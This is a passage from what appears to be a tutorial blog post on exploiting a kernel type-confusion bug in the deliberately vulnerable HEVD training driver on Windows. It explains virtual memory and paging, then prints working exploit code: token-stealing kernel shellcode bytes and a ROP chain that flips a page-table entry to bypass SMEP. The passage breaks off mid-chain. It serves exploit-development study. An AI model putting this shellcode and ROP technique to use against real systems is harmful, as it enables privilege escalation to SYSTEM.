+<p><strong>wafzsucks</strong> put it perfectly, this is why when a game is loaded, the fans kick off and a bunch of memory is used before the game even starts. This is because the memory is allocated and obtained while the game is loaded into said memory.</p>
+<p>With the use of <em>VirtualAlloc()</em> in Windows and <em>mmap()</em> in Linux, we can actually map a range of virtual memory at a defined address. This is why this solution is a solid approach to stack pivoting.</p>
+<h2 id="virtual-memory">Virtual Memory</h2>
+<p>The image below is taken from <a href="https://wafzsucks.medium.com/how-a-simple-k-typeconfusion-took-me-3-months-long-to-create-a-exploit-f643c94d445f">wafzsucks</a> blog.</p>
+<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/vm.png" alt="alt text"></p>
+<p>We can see in the image above that a virtaul address is mapped to multiple regions in physical memory. In short the OS manages virtual address spaces and the assignment of real memory. Address translation hardware in the CPU, often referred to as a memory management unit (MMU), automatically translates virtual addresses to physical addresses.</p>
+<p>As stated by <a href="https://en.wikipedia.org/wiki/Virtual_memory">Wikipedia</a>, the benefits of virtual memory include:</p>
+<ul>
+<li>Applications don&rsquo;t have to manage shared memory space</li>
+<li>Ability to share memory used by libraries between processes</li>
+<li>Increased security due to memory isolation</li>
+</ul>
+<p>And conceptually being able to use more memory than might be physically availible, using the technique of paging or segmentation.</p>
+<h2 id="paged-memory-summary">Paged Memory Summary</h2>
+<p>When we hear the words <code>Paged memory</code> we&rsquo;re refering to a technique where the OS divides a program&rsquo;s or system&rsquo;s memory into fixed blocks called pages (as we know). Below are some key concepts to keep in mind with paged memory:</p>
+<ul>
+<li>Page Table
+<ul>
+<li>Operating systems maintain a data structure known as a page table. This table keeps track of the mapping between virtaul memory addresses used by a program and the physical memory address location where the actaul data is stored.</li>
+</ul>
+</li>
+<li>Virtual Memory
+<ul>
+<li>As prevously mentioned this is how programs interact with physical memory without directly touching it. Basically translating virtual addresses to physical addresses.</li>
+</ul>
+</li>
+<li>Page Faults
+<ul>
+<li>When a program access a virtual memory page that is not currently in physical memory, a page fault occurs. From here control is transferred from the program to the operating system.</li>
+</ul>
+</li>
+<li>Demand Paging
+<ul>
+<li>Most operating systems use demang paging, which is where pages are only loaded into memory when needed. This is to conserve physical memory by loading ONLY pages that are actively being used.</li>
+</ul>
+</li>
+<li>Page Replacement
+<ul>
+<li>If physical memory is full, the operating system may need to choose which paged to remove from memory to make space for new pages.</li>
+</ul>
+</li>
+<li>Page Size
+<ul>
+<li>The size of each page is a crucial factor in the efficiency of memory management. A smaller page size can lead to more fine-grained memory management but may also result in increased overhead due to a larger page table. A larger page size might reduce the table size, but may result in more data being loaded into memory even if only a small portion is needed.</li>
+</ul>
+</li>
+</ul>
+<h1 id="testing-theory">Testing Theory</h1>
+<p>Let&rsquo;s revisit our code example and run it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  lpvAllocTarget <span style="color:#f92672">=</span> (LPVOID)<span style="color:#ae81ff">0xF6C875C0</span>;
+</span></span><span style="display:flex;"><span>  lpvAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>((lpvAllocTarget <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>),
+</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x10000</span>,
+</span></span><span style="display:flex;"><span>                               (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                               PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvAllocation <span style="color:#f92672">==</span> NULL)         
+</span></span><span style="display:flex;"><span>  { 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectId <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)lpvAllocation;
+</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectType <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)lpvNtKrnl <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x32e4fe</span>; <span style="color:#75715e">// mov esp, 0xF6C875C0 ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering Type Confusion</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  TYPE_CONFUSION,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>UserTypeConfusionObject,
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(UserTypeConfusionObject),
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span></code></pre></div><p>If we check the PTE of the new stack address we&rsquo;ll see this is <strong>NOT</strong> a valid page entry.</p>
+<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/pte.png" alt="alt text"></p>
+<p>Meaning that the control will be given to the kernel and we crash!</p>
+<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/crash2.png" alt="alt text"></p>
+<p>This is due to the aforemention <strong>Demand Paging</strong>. To make this a valid page, we can try writing to the prevous page to avoid the <strong>Page Fault</strong> since it will then be in use! Let&rsquo;s try it!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  lpvAllocTarget <span style="color:#f92672">=</span> (LPVOID)<span style="color:#ae81ff">0xF6C875C0</span>;
+</span></span><span style="display:flex;"><span>  lpvAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>((lpvAllocTarget <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>),
+</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x10000</span>,
+</span></span><span style="display:flex;"><span>                               (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                               PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvAllocation <span style="color:#f92672">==</span> NULL)               
+</span></span><span style="display:flex;"><span>  { 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Successfully created allocation: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvAllocation);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Writing random buffer to prevous page</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlFillMemory</span>((lpvAllocTarget<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1000</span>), <span style="color:#ae81ff">0x1000</span>, <span style="color:#e6db74">&#39;A&#39;</span>);
+</span></span></code></pre></div><p>This time when we hit the breakpoint we can see that the page is valid :)</p>
+<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/ptev.png" alt="alt text"></p>
+<p>However we still get a crash? This is where <code>VirtualLock</code> comes into play.</p>
+<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/toohigh.PNG" alt="alt text"></p>
+<p>However, I still got a crash! Based on the information from Kristal-G&rsquo;s blog it looks like this address it too high. This is also shown by the actual error above - with that I decided to change my stack pivot gadget.</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>After crying for a while I managed to get together a reliable exploit as shown below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define TYPE_CONFUSION 0x222023
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Type Confusion */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USER_TYPE_CONFUSION_OBJECT {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ObjectId;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ObjectType;
+</span></span><span style="display:flex;"><span>} USER_TYPE_CONFUSION_OBJECT, <span style="color:#f92672">*</span>PUSER_TYPE_CONFUSION_OBJECT;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GetKernelModuleBase():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Function used to obtain kernel module address */</span>
+</span></span><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">GetKernelModuleBase</span>(PCHAR pKernelModule)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> pcDriver[<span style="color:#ae81ff">1024</span>]    <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  LPVOID lpvTargetDriver <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID <span style="color:#f92672">*</span>lpvDrivers     <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD dwCB             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwDrivers        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD i                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, dwCB, <span style="color:#f92672">&amp;</span>dwCB);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwCB <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvDrivers <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwCB <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(LPVOID));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvDrivers <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EnumDeviceDrivers</span>(lpvDrivers, dwCB, <span style="color:#f92672">&amp;</span>dwCB))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    dwDrivers <span style="color:#f92672">=</span> dwCB <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(LPVOID);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwDrivers; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetDeviceDriverBaseNameA</span>(lpvDrivers[i], pcDriver, <span style="color:#66d9ef">sizeof</span>(pcDriver)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrA</span>(pcDriver, pKernelModule) <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>          lpvTargetDriver <span style="color:#f92672">=</span> lpvDrivers[i];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(lpvDrivers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> lpvTargetDriver;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">WriteGadgets</span>(LPVOID lpvNt, LPVOID lpvBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(lpvBuffer);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> nt <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)(lpvNt);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8_t</span> sc[<span style="color:#ae81ff">129</span>] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x04</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x04</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// sickle-tool -p windows/x64/kernel_sysret -f num (71)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x88</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x8a</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x0f</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x07</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  LPVOID shellcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, <span style="color:#66d9ef">sizeof</span>(sc), MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlCopyMemory</span>(shellcode, sc, <span style="color:#ae81ff">129</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Prepare RDX register for later. This is needed for the XOR operation */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40ed4e</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000008</span>; <span style="color:#75715e">// Set RDX to 0x08, we will need this to accomplish the XOR
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     userland code. The setup is as follows:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       RAX -&gt; VOID *MiGetPteAddress(
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         ( RCX == PTE / Userland Code )
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       );
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Once the call is complete RAX should contain the pointer to our PTE. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x57699c</span>;       <span style="color:#75715e">// pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)shellcode; <span style="color:#75715e">// *shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24aaec</span>;       <span style="color:#75715e">// MiGetPteAddress()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30fcf3</span>; <span style="color:#75715e">// sub rax, rdx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x54f344</span>; <span style="color:#75715e">// push rax ; pop rbx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40ed4e</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000004</span>; <span style="color:#75715e">// 0x40ed4e: pop rdx ; pop rax ; pop rcx ; ret ; (1 found)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
